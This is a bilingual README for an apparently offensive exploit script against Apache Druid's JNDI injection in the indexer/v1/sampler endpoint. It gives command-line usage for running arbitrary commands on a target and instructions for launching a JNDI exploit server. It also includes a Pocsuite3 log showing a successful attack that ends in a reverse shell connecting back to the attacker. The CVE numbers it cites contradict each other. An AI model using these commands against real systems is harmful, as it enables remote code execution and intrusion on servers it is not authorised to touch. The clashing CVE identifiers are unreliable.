# Apache Druid JNDI Vuln
## Druid JNDI 注入漏洞利用脚本
本项目是一个利用 Druid JNDI 注入漏洞的 Python 脚本。该漏洞存在于 Druid 的 indexer/v1/sampler 接口中，攻击者可以通过构造恶意请求，在目标服务器上执行任意命令。

This project is a Python script that exploits the Druid JNDI injection vulnerability. The vulnerability exists in the indexer/v1/sampler interface of Druid, allowing an attacker to execute arbitrary commands on the target server by constructing a malicious request.

## 使用方法
使用该脚本需要提供以下参数：
- -t 或 --target：目标服务器的 IP 地址或主机名；
- -j 或 --jndi-ip：JNDI 服务器的 IP 地址；
- -c 或 --cmd：要执行的命令。
## 示例：

```bash
python druid.py -t 192.168.0.1 -j 192.168.0.2 -c "touch /tmp/success"
```
使用该脚本需要先安装 Python 3 和 requests 库。

## 注意事项
该脚本仅用于授权的渗透测试或教育目的，禁止用于非法用途；
在使用该脚本时，请务必遵守当地法律法规和道德准则，自行承担使用该脚本所造成的风险和后果；
该脚本可能会对目标服务器造成不可逆的损害，请谨慎使用。

Druid JNDI Injection Exploit Script
This project is a Python script that exploits the Druid JNDI injection vulnerability. The vulnerability exists in the indexer/v1/sampler interface of Druid, allowing an attacker to execute arbitrary commands on the target server by constructing a malicious request. The CVE number for this vulnerability is CVE-2021-38645.

## Usage
To use this script, you need to provide the following parameters:
- -t or --target: the IP address or hostname of the target server;
- -j or --jndi-ip: the IP address of the JNDI server;
- -c or --cmd: the command to execute.
## Example:

```bash
python druid.py -t 192.168.0.1 -j 192.168.0.2 -c "touch /tmp/success"
```
To use this script, you need to install Python 3 and the requests library first.

## Disclaimer
This script is for authorized penetration testing or educational purposes only. It is strictly prohibited to use it for illegal purposes;
When using this script, please comply with local laws and regulations, and ethical standards. You are solely responsible for the risks and consequences caused by using this script;This script may cause irreversible damage to the target server. Use it at your own risk.

# 复现
启动 [JNDIExploit-1](https://github.com/Avento/JNDIExploit-1)
```bash
java -jar JNDIExploit.jar -i 192.168.47.1
```

执行 poc 脚本
```bash
python druid.py -t 192.168.2.222 -j 192.168.47.1 -c "touch /tmp/success"
```
# Pocsuite3
```bash
Pocsuite3 > use pocs\Java_Druid_CVE-2023-25194
Pocsuite3 (pocs\Java_Druid_CVE-2023-25194) > set target http://192.168.47.130:8888/unified-console.html
[11:01:18] [INFO] target => http://192.168.47.130:8888/unified-console.html
Pocsuite3 (pocs\Java_Druid_CVE-2023-25194) > attack
[11:01:20] [INFO] pocsusite got a total of 1 tasks
[11:01:20] [INFO] running poc:'Apache Druid(Apache Kafka) JNDI 注入 PoC' target 'http://192.168.47.130:8888/unified-console.html'
[11:01:20] [+] Status : 500
[11:01:20] [+] Host : 192.168.47.130:8888
[11:01:20] [+] URL : http://192.168.47.130:8888/druid/indexer/v1/sampler
[11:01:20] [+] Command : touch /tmp/success_druid_pocsuite3
[11:01:20] [INFO] Scan completed,ready to print

+-------------------------------------------------+------------------------------------------+--------+--------------+------------+---------+
| target-url                                      |                 poc-name                 | poc-id |  component   |  version   |  status |
+-------------------------------------------------+------------------------------------------+--------+--------------+------------+---------+
| http://192.168.47.130:8888/unified-console.html | Apache Druid(Apache Kafka) JNDI 注入 PoC |   0    | Apache Druid |  <= 25.0.0 | success |
+-------------------------------------------------+------------------------------------------+--------+--------------+------------+---------+
success : 1 / 1
Pocsuite3 (pocs\Java_Druid_CVE-2023-25194) > shell
[11:01:49] [INFO] pocsusite got a total of 1 tasks
[11:01:49] [*] listening on 0.0.0.0:6666
[11:01:49] [INFO] running poc:'Apache Druid(Apache Kafka) JNDI 注入 PoC' target 'http://192.168.47.130:8888/unified-console.html'
[11:01:49] [+] new connection established from 10.91.56.84
[11:01:49] [INFO] connect back ip: 10.91.56.84    port: 6666
[11:01:49] [INFO] watting for shell connect to pocsuite
Now Connected: 10.91.56.84
SHELL (10.91.56.84) > whoami
bash: no job control in this shell
[qax@localhost apache-druid-0.19.0]$ whoami
ikun
```
